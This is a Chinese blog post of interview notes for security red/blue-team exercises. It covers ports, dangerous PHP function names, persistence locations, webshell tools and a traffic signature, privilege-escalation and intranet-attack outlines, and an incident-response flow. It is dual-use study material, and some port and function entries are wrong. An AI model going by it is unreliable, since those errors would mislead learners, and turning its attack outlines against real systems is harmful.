<p><strong>应急响应</strong></p>
<ul>
<li></li>
</ul>
<blockquote>
<p><strong>火绒剑，微步云沙箱，Goby，PowerTool，Tcpview，PCHunter，ProcessHacker，Everything，ProcessExplorer，ProcessMonitor，XueTr，PCHunter，ProcessDump，AutoRuns，ntfsdir，FastIR，BrowsingHistoryView，sysinspector，sysinternals Suite，Index.dat Analyzer，winhex，RegistryWorkshop，DiskGenius，passrecenc，Fulleventlogview，Wsyscheck，IPOP4.1，Process monitor，Netcat，Malware Defender，MyMonitor，DllInjector，RegShot，gscan，Fodler Monitor，ResHacker，Kaspersky Virus Removal Tool ，DWirelessNetWatcher，ipradar，Fidder，ApateDNS，MiniSniffer，SysTracer等</strong></p>
</blockquote>
<p>火绒剑</p>
<h2 id="19-常见的端口和相关的服务？">19.常见的端口和相关的服务？</h2>
<p>个人感觉比较重要的</p>
<table>
<thead>
<tr>
<th>服务</th>
<th>端口号</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>FTP</strong></td>
<td><strong>20</strong></td>
<td>FTP服务器真正传输所用的端口，用于上传、下载</td>
</tr>
<tr>
<td><strong>FTP</strong></td>
<td><strong>21</strong></td>
<td>用于FTP的登陆认证</td>
</tr>
<tr>
<td><strong>SSH、SFTP 、</strong></td>
<td><strong>22</strong></td>
<td><code>加密</code>的远程登录，文件传输</td>
</tr>
<tr>
<td><strong>Telnet</strong></td>
<td><strong>23</strong></td>
<td>远程登录（在本地主机上使用此端口与远程服务器的22/3389端口连接）</td>
</tr>
<tr>
<td><strong>SMTP</strong></td>
<td><strong>25</strong></td>
<td>用于发送邮件</td>
</tr>
<tr>
<td><strong>DNS</strong></td>
<td><strong>53</strong></td>
<td>域名解析</td>
</tr>
<tr>
<td><strong>HTTP</strong></td>
<td><strong>80</strong></td>
<td>用于网页浏览</td>
</tr>
<tr>
<td><strong>POP3</strong></td>
<td><strong>110</strong></td>
<td>SUN公司的RPC服务所有端口</td>
</tr>
<tr>
<td><strong>HTTPS</strong></td>
<td><strong>443</strong></td>
<td><code>加密</code>的网页浏览端口</td>
</tr>
<tr>
<td><strong>sql server</strong></td>
<td><strong>1433</strong></td>
<td>Microsoft的SQL服务开放的端口 <code>数据库</code></td>
</tr>
<tr>
<td><strong>Oracle</strong></td>
<td><strong>1521</strong></td>
<td><code>数据库</code></td>
</tr>
<tr>
<td><strong>MySQL</strong></td>
<td><strong>3306</strong></td>
<td><code>数据库</code></td>
</tr>
<tr>
<td><strong>WIN2003远程登录</strong></td>
<td><strong>3389</strong></td>
<td>Windows 2000(2003) Server远程桌面的服务端口，<code>本地服务器开放</code>此端口，去连接到远程的服务器</td>
</tr>
<tr>
<td><strong>QQ·</strong></td>
<td><strong>4000</strong></td>
<td>腾讯QQ客户端开放此端口</td>
</tr>
<tr>
<td><strong>redis·</strong></td>
<td><strong>6379</strong></td>
<td>数据库</td>
</tr>
</tbody>
</table>
<p>文章中列出来的</p>
<table>
<thead>
<tr>
<th>服务</th>
<th>端口号</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>FTP</strong></td>
<td><strong>20</strong></td>
<td>FTP服务器真正传输所用的端口，用于上传、下载</td>
</tr>
<tr>
<td><strong>FTP</strong></td>
<td><strong>21</strong></td>
<td>用于FTP的登陆认证</td>
</tr>
<tr>
<td><strong>SSH、SFTP 、</strong></td>
<td><strong>22</strong></td>
<td><code>加密</code>的远程登录，文件传输</td>
</tr>
<tr>
<td><strong>Telnet</strong></td>
<td><strong>23</strong></td>
<td>远程登录（在本地主机上使用此端口与远程服务器的22/3389端口连接）</td>
</tr>
<tr>
<td><strong>SMTP</strong></td>
<td><strong>25</strong></td>
<td>用于发送邮件</td>
</tr>
<tr>
<td><strong>DNS</strong></td>
<td><strong>53</strong></td>
<td>域名解析</td>
</tr>
<tr>
<td><strong>HTTP</strong></td>
<td><strong>80</strong></td>
<td>用于网页浏览</td>
</tr>
<tr>
<td><strong>POP3</strong></td>
<td><strong>110</strong></td>
<td>SUN公司的RPC服务所有端口</td>
</tr>
<tr>
<td><strong>Network News Transfer Protocol</strong></td>
<td><strong>119</strong></td>
<td>NEWS新闻组传输协议，承载USENET通信</td>
</tr>
<tr>
<td><strong>SMTP</strong></td>
<td><strong>161</strong></td>
<td>Simple Network Management Protocol，简单网络管理协议</td>
</tr>
<tr>
<td><strong>SNMP Trap</strong></td>
<td><strong>160、162</strong></td>
<td>SNMP陷阱</td>
</tr>
<tr>
<td><strong>HTTPS</strong></td>
<td><strong>443</strong></td>
<td><code>加密</code>的网页浏览端口</td>
</tr>
<tr>
<td><strong>CIFS</strong></td>
<td><strong>445</strong></td>
<td>公共Internet文件系统</td>
</tr>
<tr>
<td><strong>sql server</strong></td>
<td><strong>1433</strong></td>
<td>Microsoft的SQL服务开放的端口 <code>数据库</code></td>
</tr>
<tr>
<td><strong>Oracle</strong></td>
<td><strong>1521</strong></td>
<td><code>数据库</code></td>
</tr>
<tr>
<td><strong>NFS</strong></td>
<td><strong>2049</strong></td>
<td>通过网络，让不同的机器、不同的操作系统实现文件共享</td>
</tr>
<tr>
<td><strong>MySQL</strong></td>
<td><strong>3306</strong></td>
<td><code>数据库</code></td>
</tr>
<tr>
<td><strong>WIN2003远程登录</strong></td>
<td><strong>3389</strong></td>
<td>Windows 2000(2003) Server远程桌面的服务端口，<code>本地服务器开放</code>此端口，去连接到远程的服务器</td>
</tr>
<tr>
<td><strong>QQ</strong></td>
<td><strong>4000</strong></td>
<td>腾讯QQ客户端开放此端口</td>
</tr>
<tr>
<td><strong>redis</strong></td>
<td><strong>6379</strong></td>
<td>数据库</td>
</tr>
<tr>
<td><strong>WebLogic</strong></td>
<td><strong>7001</strong></td>
<td>一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器</td>
</tr>
<tr>
<td><strong>Wingate</strong></td>
<td><strong>8010</strong></td>
<td>Wingate代理开放此端口</td>
</tr>
<tr>
<td><strong>TOMCAT</strong></td>
<td><strong>8080</strong></td>
<td>WWW代理开放此端口</td>
</tr>
</tbody>
</table>
<h2 id="20-常见的数据库及对应端口？">20.常见的数据库及对应端口？()</h2>
<p><strong>关系型数据库：</strong></p>
<ul>
<li><strong>MYSQL       3306</strong></li>
<li><strong>SQL Server    1433</strong></li>
<li><strong>Oracle        1521</strong></li>
<li><strong>DB2          5000</strong></li>
</ul>
<p><strong>非关系型数据库：</strong></p>
<ul>
<li><strong>Redis          6379</strong></li>
<li><strong>Memcached    11211</strong></li>
<li><strong>MongoDB      27017</strong></li>
</ul>
<h2 id="21-为何一个mysql数据库的站，只有一个80端口开放？">21.为何一个mysql数据库的站，只有一个80端口开放？</h2>
<ul>
<li>Mysql默认端口被修改</li>
<li>站库分离</li>
<li>3306端口不对外开放</li>
</ul>
<h2 id="22-3389-远程连接-无法连接的几种情况？">22.3389(远程连接)无法连接的几种情况？</h2>
<ul>
<li>端口被修改</li>
<li>没开放3389端口</li>
<li><strong>防护拦截</strong></li>
</ul>
<blockquote>
<p><strong>1.做了tcp/ip筛选   2.终端登陆权限指定用户  3.防火墙</strong></p>
</blockquote>
<ul>
<li><strong>处于内网(需进行端口转发)</strong></li>
<li><strong>超过了服务器最大连接数</strong></li>
</ul>
<h2 id="23-判断出网站的CMS对渗透有什么意义？">23.判断出网站的CMS对渗透有什么意义？</h2>
<ul>
<li>查找已曝光的漏洞。</li>
<li>如果开源,还能下载相应的源码进行代码审计</li>
<li>根据CMS特征关联同CMS框架站点,进行敏感备份文件扫描,有肯获得站点备份文件</li>
</ul>
<h2 id="24-如何判断目标操作系统">24.如何判断目标操作系统?</h2>
<ul>
<li>大小写检测:windows大小写不敏感,linux大小写敏感</li>
<li>ping指令L:根据TTL值,windows一般情况下&gt;100,linux&lt;100(<a target="_blank" rel="noopener" href="https://www.lmlphp.com/user/64797/article/item/778238/">https://www.lmlphp.com/user/64797/article/item/778238/</a>)</li>
</ul>
<h2 id="25-常见代码执行、文件读取、命令执行的函数有哪些">25.常见代码执行、文件读取、命令执行的函数有哪些?</h2>
<h3 id="代码执行">代码执行</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()</span><br><span class="line">call_user_array()</span><br><span class="line">create_function()</span><br><span class="line">array_map()</span><br><span class="line">call_user_func()</span><br></pre></td></tr></table></figure>
<h3 id="文件读取">文件读取</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fopen()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br><span class="line">fread()</span><br></pre></td></tr></table></figure>
<h3 id="命令执行">命令执行</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
<h2 id="26-木马驻留系统的方式有哪些？">26.木马驻留系统的方式有哪些？</h2>
<p>关联文件类型</p>
<p>计划任务</p>
<p>启动目录</p>
<p>注册表</p>
<p>服务</p>
<p>27.蚁剑/菜刀/C刀/冰蝎的相同与不相同之处？</p>
<ul>
<li><strong>相同：  都是用来连接Webshell的工具</strong></li>
<li><strong>不同：  相比于其他三款，冰蝎有流量动态加密。</strong>(<a target="_blank" rel="noopener" href="https://www.jb51.net/article/262772.htm">https://www.jb51.net/article/262772.htm</a>)</li>
</ul>
<blockquote>
<p><strong>冰蝎强特征：content-type为application/octet-stream</strong></p>
</blockquote>
<h2 id="27-内网渗透思路？">27.内网渗透思路？</h2>
<ol>
<li>代理穿透</li>
<li>权限维持</li>
<li>内网信息收集</li>
<li>口令爆破</li>
<li><strong>凭据窃取</strong></li>
<li><strong>社工</strong></li>
<li>横向和纵向渗透</li>
<li>拿下域控</li>
</ol>
<h2 id="28-Windows常用的提权方法？">28.Windows常用的提权方法？</h2>
<ul>
<li><strong>系统内核溢出漏洞提权</strong></li>
<li><strong>数据库提权</strong></li>
<li><strong>错误的系统配置提权</strong></li>
<li><strong>组策略首选项提权</strong></li>
<li><strong>WEB中间件漏洞提权</strong></li>
<li><strong>DLL劫持提权</strong></li>
<li><strong>滥用高危权限令牌提权</strong></li>
<li><strong>第三方软件/服务提权等</strong></li>
</ul>
<h2 id="29-Linux常用的提权方法？">29.Linux常用的提权方法？</h2>
<p><strong>答：</strong></p>
<ul>
<li><strong>Linux内核漏洞提权</strong></li>
<li><strong>SUID提权</strong> (低权限用户目录下可被Root权限用户调用的脚本提权）</li>
<li><strong>环境变了劫持高权限程序提权</strong></li>
<li><strong>sudoer配置文件错误提权</strong></li>
</ul>
<h2 id="30-正向代理和反向代理的区别">30.正向代理和反向代理的区别?</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正向代理即是客户端代理,代理客户端,服务端不知大实际发起请求的客户端</span><br><span class="line"></span><br><span class="line">反向代理即是服务端代理,代理服务端,客户端不知道实际提供服务的服务端</span><br></pre></td></tr></table></figure>
<h2 id="31-正向shell和反向shell的区别？">31.正向shell和反向shell的区别？</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正向shell: 攻击者连接被攻击者机器,可用于攻击者处于内网,被攻击者处于公网的情况.</span><br><span class="line"></span><br><span class="line">反向shell: 被攻击者主动连接攻击者,可用于攻击者处于外网,被攻击者处于内网的情况.</span><br></pre></td></tr></table></figure>
<h2 id="32-序列化与反序列化的区别？">32.序列化与反序列化的区别？</h2>
<ul>
<li>序列化: 把对象转化为可传输的字节序列的过程</li>
<li>反序列化: 把字节序列转化为对象的过程</li>
</ul>
<h1>基本思路流程</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 收集信息：收集客户信息和中毒主机信息，包括样本 </span><br><span class="line">2. 判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断⽹、DoS 等等 </span><br><span class="line">3. 抑制范围：隔离使受害⾯不继续扩⼤ </span><br><span class="line">4. 深⼊分析：⽇志分析、进程分析、启动项分析、样本分析⽅便后期溯源 </span><br><span class="line">5. 清理处置：杀掉进程，删除⽂件，打补丁，删除异常系统服务，清除后⻔账号防⽌事件扩 ⼤，处理完毕后恢复⽣产 </span><br><span class="line">6. 产出报告：整理并输出完整的安全事件报告</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io">Jinmu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io/%E9%9D%A2%E8%AF%95/HW%E9%9D%A2%E8%AF%95/">https://jinmu1108.github.io/%E9%9D%A2%E8%AF%95/HW%E9%9D%A2%E8%AF%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jinmu1108.github.io" target="_blank">J1Nmu</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/%E9%9D%A2%E8%AF%95/">面试</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/%E8%93%9D%E9%98%9F/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E8%93%9D%E9%98%9F-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">蓝队</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/Crypto/AES/Crypto-AES/" title="Crypto-AES"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-19</div><div class="title">Crypto-AES</div></div></a></div><div><a href="/Crypto/RC4/Crypto-RC4/" title="Crypto-RC4"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-18</div><div class="title">Crypto-RC4</div></div></a></div><div><a href="/Crypto/Crypto/" title="Crypto"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-05</div><div class="title">Crypto</div></div></a></div><div><a href="/Crypto/RSA/Crypto-RSA/" title=""><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-19</div><div class="title"></div></div></a></div><div><a href="/Crypto/%E7%90%86%E8%AE%BA/Crypto%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/" title="Crypto理论知识"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-31</div><div class="title">Crypto理论知识</div></div></a></div><div><a href="/Web/JWT/JWT/" title="JWT"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-14</div><div class="title">JWT</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jinmu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/jinmu1108"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">HW面试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OSI-%E7%9A%84%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">OSI 的七层模型都有哪些？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E5%B8%B8%E8%8E%B7%E5%8F%96%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">任意文件读取，我们通常获取什么文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf%E4%BD%BF%E7%94%A8%E4%BA%86%E4%BB%80%E4%B9%88%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.</span> <span class="toc-text">ssrf使用了什么协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BD%BF%E7%94%A8%E4%BA%86%E4%BB%80%E4%B9%88%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.4.</span> <span class="toc-text">PHP文件包含使用了什么协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter%EF%BC%88%E6%9C%AC%E5%9C%B0%E7%A3%81%E7%9B%98%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input%E8%AE%BF%E9%97%AE%E8%AF%B7%E6%B1%82%E7%9A%84%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8F%AA%E8%AF%BB%E6%B5%81-%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E5%88%B0POST%E4%B8%8A%E6%B2%A1%E6%9C%89%E7%BB%8F%E8%BF%87%E8%A7%A3%E6%9E%90%E7%9A%84%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%E3%80%82"><span class="toc-number">1.4.2.</span> <span class="toc-text">php:&#x2F;&#x2F;input	访问请求的原始数据的只读流,直接读取到POST上没有经过解析的原始数据。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-%E9%80%9A%E8%BF%87file%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%88%B0%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">1.4.3.</span> <span class="toc-text">file:&#x2F;&#x2F;	通过file伪协议可以访问本地文件系统，读取到文件的内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data"><span class="toc-number">1.4.4.</span> <span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-php%E8%A7%A3%E5%8E%8B%E7%BC%A9%E7%9A%84%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%8D%E7%AE%A1%E5%90%8E%E7%BC%80%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E9%83%BD%E4%BC%9A%E5%BD%93%E5%81%9A%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%9D%A5%E8%A7%A3%E5%8E%8B"><span class="toc-number">1.4.5.</span> <span class="toc-text">phar:&#x2F;&#x2F;	php解压缩的一个函数，不管后缀是什么，都会当做压缩包来解压</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zlib-%E2%80%94-%E5%8E%8B%E7%BC%A9%E6%B5%81"><span class="toc-number">1.4.6.</span> <span class="toc-text">zlib:&#x2F;&#x2F; — 压缩流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp-%E2%80%94-%E8%AE%BF%E9%97%AE-FTP-s-URLs"><span class="toc-number">1.4.7.</span> <span class="toc-text">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.5.</span> <span class="toc-text">各种数据库的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-getshell%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">1.6.</span> <span class="toc-text">Redis getshell的过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E6%80%8E%E4%B9%88%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">1.7.</span> <span class="toc-text">sqlmap怎么看当前用户权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap-os-shell-%E5%90%8E%E5%8F%B0%E6%89%A7%E8%A1%8C%E4%BA%86%E4%BB%80%E4%B9%88%E6%93%8D%E4%BD%9C"><span class="toc-number">1.8.</span> <span class="toc-text">sqlmap --os-shell 后台执行了什么操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap%E6%80%8E%E4%B9%88%E9%9A%90%E8%97%8Fip%E6%89%AB%E6%8F%8F"><span class="toc-number">1.9.</span> <span class="toc-text">nmap怎么隐藏ip扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E8%BF%87SRC%E5%90%97"><span class="toc-number">1.10.</span> <span class="toc-text">挖过SRC吗?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E8%BF%87%E5%93%AA%E4%BA%9B%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="toc-number">1.11.</span> <span class="toc-text">用过哪些安全设备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">1.12.</span> <span class="toc-text">Webshell管理工具的流量特征</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8F%9C%E5%88%80"><span class="toc-number">1.12.1.</span> <span class="toc-text">菜刀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91"><span class="toc-number">1.12.2.</span> <span class="toc-text">蚁剑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E"><span class="toc-number">1.12.3.</span> <span class="toc-text">冰蝎</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E2-0"><span class="toc-number">1.12.3.1.</span> <span class="toc-text">冰蝎2.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E3-0"><span class="toc-number">1.12.3.2.</span> <span class="toc-text">冰蝎3.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E4-0"><span class="toc-number">1.12.3.3.</span> <span class="toc-text">冰蝎4.0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Content-Type"><span class="toc-number">1.12.3.3.1.</span> <span class="toc-text">Content-Type</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#User-agent-%E5%AD%97%E6%AE%B5"><span class="toc-number">1.12.3.3.2.</span> <span class="toc-text">User-agent 字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.12.3.3.3.</span> <span class="toc-text">端口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HP-webshell-%E4%B8%AD%E5%AD%98%E5%9C%A8%E5%9B%BA%E5%AE%9A%E4%BB%A3%E7%A0%81"><span class="toc-number">1.12.3.3.4.</span> <span class="toc-text">HP webshell  中存在固定代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%95%BF%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.12.3.3.5.</span> <span class="toc-text">长连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9B%BA%E5%AE%9A%E7%9A%84%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%92%8C%E5%93%8D%E5%BA%94%E5%A4%B4"><span class="toc-number">1.12.3.3.6.</span> <span class="toc-text">固定的请求头和响应头</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E5%AF%86%E7%A0%81"><span class="toc-number">1.12.3.3.7.</span> <span class="toc-text">连接密码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">1.13.</span> <span class="toc-text">渗透测试流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%B9%E7%BC%98%E8%B5%84%E4%BA%A7%E5%A6%82%E4%BD%95%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.14.</span> <span class="toc-text">边缘资产如何探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">1.14.1.</span> <span class="toc-text">子域名收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.14.1.1.</span> <span class="toc-text">搜索引擎查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E6%9F%A5%E8%AF%A2%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.14.1.2.</span> <span class="toc-text">在线查询接口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9A%B4%E5%8A%9B%E7%8C%9C%E8%A7%A3"><span class="toc-number">1.14.1.3.</span> <span class="toc-text">子域名暴力猜解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS%E6%9F%A5%E8%AF%A2-%E6%9E%9A%E4%B8%BE"><span 